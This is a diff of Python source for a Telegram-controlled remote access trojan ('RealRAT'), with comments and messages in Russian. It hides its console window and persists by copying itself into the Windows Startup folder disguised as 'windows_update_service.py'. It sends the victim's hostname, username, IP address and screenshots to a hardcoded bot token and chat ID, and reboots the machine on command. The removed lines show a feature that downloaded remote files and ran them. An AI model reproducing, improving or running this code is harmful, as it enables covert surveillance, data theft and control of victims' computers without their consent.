@@ -6,7 +6,6 @@ import time
 import shutil
 import socket
 import sys
-import json
 
 try:
     from PIL import ImageGrab
@@ -21,21 +20,12 @@ except ImportError:
 BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
 CHAT_ID = "-1003442349627"
 
-selected_pc = None
-victims = {}
-
 class RealRAT:
     def __init__(self):
         self.bot_token = BOT_TOKEN
         self.chat_id = CHAT_ID
         self.victim_id = socket.gethostname()
         self.last_update_id = 0
-        
-        victims[self.victim_id] = {
-            'username': os.getlogin(),
-            'online': True,
-            'last_seen': time.time()
-        }
         
     def hide_console(self):
         try:
@@ -48,6 +38,7 @@ class RealRAT:
             pass
 
     def setup_persistence(self):
+        """Добавляем в автозагрузку и запускаем"""
         try:
             if platform.system().startswith("Windows"):
                 appdata = os.getenv('APPDATA')
@@ -56,12 +47,17 @@ class RealRAT:
                 script_path = os.path.abspath(__file__)
                 target_path = os.path.join(startup_dir, 'windows_update_service.py')
                 
+                # Копируем себя в автозагрузку
                 if not os.path.exists(target_path):
                     shutil.copy2(script_path, target_path)
                     subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
+                
+                # ЗАПУСКАЕМ СЕБЯ ИЗ АВТОЗАГРУЗКИ
+                subprocess.Popen(['python', target_path], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
                     
-        except:
-            pass
+        except Exception as e:
+            print(f"Ошибка автозагрузки: {e}")
 
     def send_to_telegram(self, text):
         try:
@@ -70,7 +66,7 @@ class RealRAT:
                 'chat_id': self.chat_id,
                 'text': text
             }
-            requests.get(url, params=params, timeout=5)
+            requests.get(url, params=params, timeout=10)
         except:
             pass
 
@@ -80,105 +76,52 @@ class RealRAT:
             with open(filename, 'rb') as file:
                 files = {'document': file}
                 data = {'chat_id': self.chat_id}
-                requests.post(url, data=data, files=files, timeout=5)
+                requests.post(url, data=data, files=files, timeout=10)
         except:
             pass
 
-    def download_file(self, file_id, filename):
-        """Скачивает файл из Telegram"""
-        try:
-            # Получаем информацию о файле
-            url = f"https://api.telegram.org/bot{self.bot_token}/getFile"
-            params = {'file_id': file_id}
-            response = requests.get(url, params=params, timeout=10)
-            
-            if response.status_code == 200:
-                file_info = response.json()
-                file_path = file_info['result']['file_path']
-                
-                # Скачиваем файл
-                download_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_path}"
-                file_response = requests.get(download_url, timeout=30)
-                
-                if file_response.status_code == 200:
-                    # Сохраняем файл
-                    with open(filename, 'wb') as f:
-                        f.write(file_response.content)
-                    return True
-                    
-        except Exception as e:
-            print(f"Ошибка скачивания: {e}")
-        return False
-
-    def send_main_keyboard(self):
-        """Основная клавиатура управления"""
+    def send_keyboard(self):
+        """Отправляем клавиатуру с кнопками"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
             keyboard = {
                 'keyboard': [
                     [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                     [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
-                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}],
-                    [{'text': '🖥️ Сменить ПК'}, {'text': '📁 Запуск файлов'}]
+                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}]
                 ],
                 'resize_keyboard': True
             }
-            
-            global selected_pc
-            current_pc = selected_pc if selected_pc else self.victim_id
-            
             params = {
                 'chat_id': self.chat_id,
-                'text': f'🎯 Управление: {current_pc}\nВыберите действие:',
+                'text': f'🎯 НОВАЯ ЖЕРТВА: {self.victim_id}\nВыберите действие:',
                 'reply_markup': keyboard
             }
-            requests.post(url, json=params, timeout=5)
-        except:
-            pass
-
-    def send_pc_selection_keyboard(self):
-        """Клавиатура выбора ПК"""
-        try:
-            victims[self.victim_id]['online'] = True
-            victims[self.victim_id]['last_seen'] = time.time()
-            
-            pc_buttons = []
-            for pc_id, pc_info in victims.items():
-                status = "🟢" if pc_info['online'] else "🔴"
-                button_text = f"{status} {pc_id}"
-                pc_buttons.append([{'text': button_text}])
-            
-            pc_buttons.append([{'text': '⬅️ Назад'}])
-            
-            keyboard = {
-                'keyboard': pc_buttons,
-                'resize_keyboard': True
-            }
-            
-            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
-            params = {
-                'chat_id': self.chat_id,
-                'text': '🖥️ Выберите компьютер:',
-                'reply_markup': keyboard
-            }
-            requests.post(url, json=params, timeout=5)
-        except:
-            pass
+            response = requests.post(url, json=params, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if 'result' in data:
+                    self.last_update_id = data['result']['update_id']
+        except Exception as e:
+            print(f"Ошибка клавиатуры: {e}")
 
     def collect_system_info(self):
         try:
-            ip = requests.get('https://ifconfig.me/ip', timeout=5).text.strip()
+            ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
             
-            info = f"""💻 СИСТЕМА:
+            info = f"""💻 НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!
 
 🖥️ Компьютер: {self.victim_id}
 👤 Пользователь: {os.getlogin()}
-🌐 IP: {ip}
-⚙️ ОС: {platform.system()} {platform.release()}"""
+🌐 IP адрес: {ip}
+⚙️ Система: {platform.system()} {platform.release()}
+📁 Директория: {os.getcwd()}
+
+🚀 RAT активирована!"""
             
             return info
         except:
-            return f"💻 Компьютер: {self.victim_id}\n👤 Пользователь: {os.getlogin()}"
+            return f"🎯 НОВАЯ ЖЕРТВА!\nКомпьютер: {self.victim_id}\nПользователь: {os.getlogin()}"
 
     def take_screenshot(self):
         try:
@@ -202,37 +145,16 @@ class RealRAT:
             return f"❌ Ошибка: {str(e)}"
 
     def uninstall_rat(self):
+        """Удаляем RAT"""
         try:
             if platform.system().startswith("Windows"):
                 startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                 rat_path = os.path.join(startup_dir, 'windows_update_service.py')
                 if os.path.exists(rat_path):
                     os.remove(rat_path)
-            
-            if self.victim_id in victims:
-                del victims[self.victim_id]
-                
             return True
         except:
             return False
-
-    def launch_file(self, file_path):
-        """Запускает любой файл"""
-        try:
-            if os.path.exists(file_path):
-                # Для EXE файлов
-                if file_path.lower().endswith('.exe'):
-                    subprocess.Popen(f'"{file_path}"', shell=True)
-                # Для других файлов (открывает программой по умолчанию)
-                else:
-                    os.startfile(file_path) if platform.system().startswith("Windows") else subprocess.Popen(['xdg-open', file_path])
-                
-                return f"✅ Запущено: {os.path.basename(file_path)}"
-            else:
-                return "❌ Файл не найден"
-                
-        except Exception as e:
-            return f"❌ Ошибка запуска: {str(e)}"
 
     def execute_command(self, command):
         try:
@@ -244,26 +166,26 @@ class RealRAT:
                 return self.collect_system_info()
                 
             elif command == '🌐 IP адрес':
-                ip = requests.get('https://ifconfig.me/ip', timeout=5).text.strip()
-                return f"🌐 IP: {ip}"
+                ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
+                return f"🌐 IP адрес: {ip}"
                 
             elif command == '📊 Процессы':
                 processes = self.get_processes()
-                return f"📊 Процессы:\n{processes}"
+                return f"📊 Запущенные процессы:\n{processes}"
                 
             elif command == '🔄 Перезагрузить':
                 if platform.system().startswith("Windows"):
-                    os.system('shutdown /r /t 5')
-                    return "🔄 Перезагрузка через 5 секунд!"
+                    os.system('shutdown /r /t 10')
+                    return "🔄 Перезагрузка через 10 секунд!"
                 else:
-                    os.system('shutdown -r now')
-                    return "🔄 Перезагрузка!"
+                    os.system('shutdown -r +1')
+                    return "🔄 Перезагрузка через 1 минуту!"
                     
             elif command == '🗑️ Удалить RAT':
                 if self.uninstall_rat():
-                    return "🗑️ RAT удалена!"
+                    return "🗑️ RAT удалена из автозагрузки! Завершение работы..."
                 else:
-                    return "❌ Ошибка удаления"
+                    return "❌ Ошибка удаления RAT"
                     
             else:
                 return "❌ Неизвестная команда"
@@ -272,10 +194,11 @@ class RealRAT:
             return f"❌ Ошибка: {str(e)}"
 
     def check_commands(self):
+        """Проверяем только НОВЫЕ команды от бота"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
-            params = {'offset': self.last_update_id + 1}
-            response = requests.get(url, params=params, timeout=5)
+            params = {'offset': self.last_update_id + 1, 'timeout': 10}
+            response = requests.get(url, params=params, timeout=15)
             
             if response.status_code == 200:
                 data = response.json()
@@ -283,90 +206,72 @@ class RealRAT:
                     for update in data['result']:
                         update_id = update['update_id']
                         
+                        # Обновляем ID последнего сообщения
                         if update_id > self.last_update_id:
                             self.last_update_id = update_id
                         
-                        if 'message' in update:
-                            message = update['message']
+                        # Обрабатываем только если есть сообщение с текстом
+                        if 'message' in update and 'text' in update['message']:
+                            message_text = update['message']['text']
                             
-                            # Обработка ТЕКСТОВЫХ команд
-                            if 'text' in message:
-                                message_text = message['text']
+                            # Обрабатываем команды с кнопок
+                            if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
+                                              '🔄 Перезагрузить', '🗑️ Удалить RAT']:
+                                result = self.execute_command(message_text)
+                                self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                 
-                                # Команда смены ПК
-                                if message_text in ['/change', '🖥️ Сменить ПК']:
-                                    self.send_pc_selection_keyboard()
-                                    continue
-                                
-                                # Кнопка Назад
-                                if message_text == '⬅️ Назад':
-                                    self.send_main_keyboard()
-                                    continue
-                                
-                                # Выбор ПК
-                                if message_text.startswith('🟢 ') or message_text.startswith('🔴 '):
-                                    selected_pc_name = message_text[2:]
-                                    if selected_pc_name in victims:
-                                        global selected_pc
-                                        selected_pc = selected_pc_name
-                                        self.send_to_telegram(f"🎯 Выбран: {selected_pc}")
-                                        self.send_main_keyboard()
-                                    continue
-                                
-                                # Основные команды (только если выбран этот ПК или не выбран никто)
-                                global selected_pc
-                                if selected_pc is None or selected_pc == self.victim_id:
-                                    if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
-                                                      '🔄 Перезагрузить', '🗑️ Удалить RAT', '📁 Запуск файлов']:
-                                        
-                                        if message_text == '📁 Запуск файлов':
-                                            self.send_to_telegram("📁 Кинь мне любой файл (exe, txt, jpg, etc) - я его скачаю и запущу!")
-                                            continue
-                                        
-                                        result = self.execute_command(message_text)
-                                        self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
-                                        
-                                        if message_text == '🗑️ Удалить RAT':
-                                            sys.exit(0)
-                            
-                            # Обработка ФАЙЛОВ
-                            elif 'document' in message:
-                                global selected_pc
-                                if selected_pc is None or selected_pc == self.victim_id:
-                                    document = message['document']
-                                    file_id = document['file_id']
-                                    file_name = document.get('file_name', 'downloaded_file')
-                                    
-                                    self.send_to_telegram(f"📥 Скачиваю файл: {file_name}")
-                                    
-                                    # Скачиваем файл
-                                    if self.download_file(file_id, file_name):
-                                        # Запускаем файл
-                                        result = self.launch_file(file_name)
-                                        self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
-                                    else:
-                                        self.send_to_telegram(f"💻 {self.victim_id}:\n❌ Ошибка скачивания файла")
+                                # Если удаляем RAT - завершаем работу
+                                if message_text == '🗑️ Удалить RAT':
+                                    time.sleep(2)
+                                    sys.exit(0)
                             
         except Exception as e:
             print(f"Ошибка проверки команд: {e}")
 
     def start(self):
+        # Скрываем консоль
         self.hide_console()
+        
+        # Устанавливаем автозагрузку И ЗАПУСКАЕМСЯ
         self.setup_persistence()
         
-        # Мгновенная отправка при запуске
+        # Ждем немного для стабильности
+        time.sleep(5)
+        
+        # Отправляем уведомление о подключении
         system_info = self.collect_system_info()
         self.send_to_telegram(system_info)
-        self.send_main_keyboard()
         
-        # Быстрый цикл
+        # Отправляем клавиатуру
+        time.sleep(2)
+        self.send_keyboard()
+        
+        # Делаем первый скриншот
+        time.sleep(3)
+        self.take_screenshot()
+        
+        print("RAT запущена и работает...")
+        
+        # Основной цикл
         while True:
             try:
                 self.check_commands()
-                time.sleep(1)
-            except:
-                time.sleep(2)
+                time.sleep(3)
+            except Exception as e:
+                print(f"Ошибка главного цикла: {e}")
+                time.sleep(10)
 
 if __name__ == '__main__':
-    rat = RealRAT()
-    rat.start()
+    # Проверяем не запущены ли мы уже из автозагрузки
+    current_file = os.path.abspath(__file__)
+    startup_file = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update_service.py')
+    
+    # Если мы НЕ из автозагрузки - копируем и запускаем оттуда
+    if current_file != startup_file and os.path.exists(startup_file):
+        # Запускаем версию из автозагрузки
+        subprocess.Popen(['python', startup_file], creationflags=subprocess.CREATE_NO_WINDOW)
+        sys.exit(0)
+    else:
+        # Запускаем текущую версию
+        rat = RealRAT()
+        rat.start()
